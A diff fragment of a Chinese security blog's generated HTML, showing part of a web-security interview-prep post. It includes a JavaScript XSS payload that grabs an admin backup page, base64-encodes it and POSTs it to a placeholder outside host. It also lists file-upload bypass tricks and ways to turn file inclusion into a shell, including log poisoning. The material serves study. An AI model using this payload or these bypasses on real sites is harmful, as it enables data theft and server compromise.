class="line">xmlHttp.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>); </span><br><span class="line">xmlHttp.send(postDATA);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">submitForm();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>2.获取当前页面的代码</p>
+<p>得到了敏感路径之后呢，就可以利用如下的JS来获取特定的页面（当然，上一步在当前页面搜集不齐URL的时候，也可以使用这个JS到别的页面搜集）</p>
+<p>关键代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">submitForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xmlHttp = createXmlHttp();</span><br><span class="line">    <span class="keyword">var</span> htmlcode = getHtmlCode(<span class="string">'http://xxxx.com/admin/asked/admin_data.asp?action=BackupData'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = encode64(htmlcode);</span><br><span class="line">        postDATA = <span class="string">"msg="</span>+html;</span><br><span class="line">        url=<span class="string">"http://aaaa.com/savePage.php"</span>;</span><br><span class="line">        xmlHttp.open(<span class="string">"POST"</span>, url, <span class="literal">true</span>);</span><br><span class="line">        xmlHttp.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>); </span><br><span class="line">        xmlHttp.send(postDATA);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    submitForm();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>得到网页源代码，其中包含敏感信息。也可以得到添加管理员的页面的代码，结合CSRF进行攻击。</p>
+<h2 id="绕过cdn获取网站的真实ip"><a href="#绕过cdn获取网站的真实ip" class="headerlink" title="绕过cdn获取网站的真实ip"></a>绕过cdn获取网站的真实ip</h2><p>复习文章：<code>https://blog.csdn.net/qq_29277155/article/details/52463908/</code></p>
+<p><strong>1.查询二级域名</strong></p>
+<p>方法：</p>
+<ul>
+<li>在线查询<code>http://i.links.cn/subdomain/</code></li>
+<li>使用AWVS中的子域名查询工具</li>
+</ul>
+<p><strong>2.nslookup</strong></p>
+<p>cmd中nslookup</p>
+<p><strong>3.直接ping一下</strong></p>
+<p><strong>4.看历史纪录</strong></p>
+<p>在线网址：<a href="http://toolbar.netcraft.com/site_report?url=www.xxx.com" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=www.xxx.com</a></p>
+<p><strong>5.phpinfo</strong></p>
+<p><strong>6.看订阅邮件</strong></p>
+<p><strong>7.rss订阅</strong></p>
+<h2 id="文件上传的绕过"><a href="#文件上传的绕过" class="headerlink" title="文件上传的绕过"></a>文件上传的绕过</h2><p>绕过上传检查 </p>
+<ul>
+<li>前端检查扩展名</li>
+</ul>
+<p>抓包绕过即可。</p>
+<ul>
+<li>Content-Type 检测文件类型</li>
+</ul>
+<p>抓包修改 Content-Type 类型，使其符合白名单规则。</p>
+<ul>
+<li>服务端添加后缀</li>
+</ul>
+<p>尝试 %00 截断</p>
+<ul>
+<li>服务端扩展名检测</li>
+</ul>
+<p>利用解析漏洞。</p>
+<ul>
+<li>Apache 解析 IIS 解析 </li>
+</ul>
+<p>其他方式后缀大小写、双写、特殊后缀如 php5 等，修改包内容的大小写过 WAF 等。</p>
+<h2 id="文件读取除了可以读取敏感文件还有什么利用方式"><a href="#文件读取除了可以读取敏感文件还有什么利用方式" class="headerlink" title="文件读取除了可以读取敏感文件还有什么利用方式"></a>文件读取除了可以读取敏感文件还有什么利用方式</h2><p>伪协议 php://input phar php://filter</p>
+<p><code>https://thief.one/2017/04/10/2/</code></p>
+<p>利用php协议进行包含</p>
+<p>截断包含</p>
+<p>远程包含shell</p>
+<p>本地包含配合文件上传</p>
+<p>本地包含配合apache日志拿shell</p>
+<p>利用/proc/self/environ进行包含</p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="https://yinwc.github.io">Ywc</a>
-            <p>原文链接: <a href="https://yinwc.github.io/2018/10/14/windows-应急流程及实战演练/">https://yinwc.github.io/2018/10/14/windows-应急流程及实战演练/</a>
-            <p>发表日期: <a href="https://yinwc.github.io/2018/10/14/windows-应急流程及实战演练/">October 14th 2018, 5:57:03 pm</a>
+            <p>原文链接: <a href="https://yinwc.github.io/2018/10/01/面试/">https://yinwc.github.io/2018/10/01/面试/</a>
+            <p>发表日期: <a href="https://yinwc.github.io/2018/10/01/面试/">October 1st 2018, 8:16:53 pm</a>
             <p>版权声明: </p>
         </div>
     
@@ -598,16 +725,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/10/17/渗透测试流程/" title= 渗透测试流程总结 >
-                    <div class="nextTitle">渗透测试流程总结</div>
+                <a href= "/2018/10/14/windows-应急流程及实战演练/" title= windows 应急流程及实战演练 >
+                    <div class="nextTitle">windows 应急流程及实战演练</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/10/01/面试/" title= Web安全知识整理 >
-                    <div class="prevTitle">Web安全知识整理</div>
+                <a href= "/2018/09/29/msf/" title= Metasploit 渗透练习 >
+                    <div class="prevTitle">Metasploit 渗透练习</div>
                 </a>
             
         </li>
@@ -719,7 +846,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见的应急响应事件分类："><span class="toc-number">2.</span> <span class="toc-text">常见的应急响应事件分类：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-入侵排查思路"><span class="toc-number">3.</span> <span class="toc-text">0x01 入侵排查思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、检查系统账号安全"><span class="toc-number">3.1.</span> <span class="toc-text">一、检查系统账号安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、检查异常端口、进程"><span class="toc-number">3.2.</span> <span class="toc-text">二、检查异常端口、进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、检查启动项、计划任务、服务"><span class="toc-number">3.3.</span> <span class="toc-text">三、检查启动项、计划任务、服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、检查系统相关信息"><span class="toc-number">3.4.</span> <span class="toc-text">四、检查系统相关信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#五、自动化查杀"><span class="toc-number">3.5.</span> <span class="toc-text">五、自动化查杀</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#六、日志分析"><span class="toc-number">4.</span> <span class="toc-text">六、日志分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-工具篇"><span class="toc-number">5.</span> <span class="toc-text">0x02 工具篇</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell-查杀："><span class="toc-number">5.1.</span> <span class="toc-text">webshell 查杀：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#病毒分析-："><span class="toc-number">5.2.</span> <span class="toc-text">病毒分析 ：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#病毒查杀："><span class="toc-number">5.3.</span> <span class="toc-text">病毒查杀：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#病毒动态："><span class="toc-number">5.4.</span> <span class="toc-text">病毒动态：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#在线病毒扫描网站："><span class="toc-number">5.5.</span> <span class="toc-text">在线病毒扫描网站：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-应急响应实战之-FTP-暴力破解"><span class="toc-number">6.</span> <span class="toc-text">0x03 应急响应实战之 FTP 暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#应急场景"><span class="toc-number">6.1.</span> <span class="toc-text">应急场景</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP的字符串中单引号与双引号的区别"><span class="toc-number">1.</span> <span class="toc-text">PHP的字符串中单引号与双引号的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#同源策略"><span class="toc-number">2.</span> <span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见端口"><span class="toc-number">3.</span> <span class="toc-text">常见端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入的原理-如何去进行防御sql注入"><span class="toc-number">4.</span> <span class="toc-text">sql注入的原理,如何去进行防御sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入有哪几类"><span class="toc-number">5.</span> <span class="toc-text">sql注入有哪几类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入报错注入指令"><span class="toc-number">6.</span> <span class="toc-text">SQL注入报错注入指令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS有哪几类"><span class="toc-number">7.</span> <span class="toc-text">XSS有哪几类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS防御"><span class="toc-number">8.</span> <span class="toc-text">XSS防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dom-xss-和反射型xss的区别"><span class="toc-number">9.</span> <span class="toc-text">dom xss 和反射型xss的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF绕过"><span class="toc-number">10.</span> <span class="toc-text">WAF绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF协议利用"><span class="toc-number">11.</span> <span class="toc-text">SSRF协议利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE防御、绕过"><span class="toc-number">12.</span> <span class="toc-text">XXE防御、绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IIS-5-x-6-0解析漏洞"><span class="toc-number">13.</span> <span class="toc-text">IIS 5.x/6.0解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-解析漏洞"><span class="toc-number">14.</span> <span class="toc-text">Apache 解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS遇到后台登录限制或者HTTPONLY时"><span class="toc-number">15.</span> <span class="toc-text">XSS遇到后台登录限制或者HTTPONLY时</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过cdn获取网站的真实ip"><span class="toc-number">16.</span> <span class="toc-text">绕过cdn获取网站的真实ip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传的绕过"><span class="toc-number">17.</span> <span class="toc-text">文件上传的绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件读取除了可以读取敏感文件还有什么利用方式"><span class="toc-number">18.</span> <span class="toc-text">文件读取除了可以读取敏感文件还有什么利用方式</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
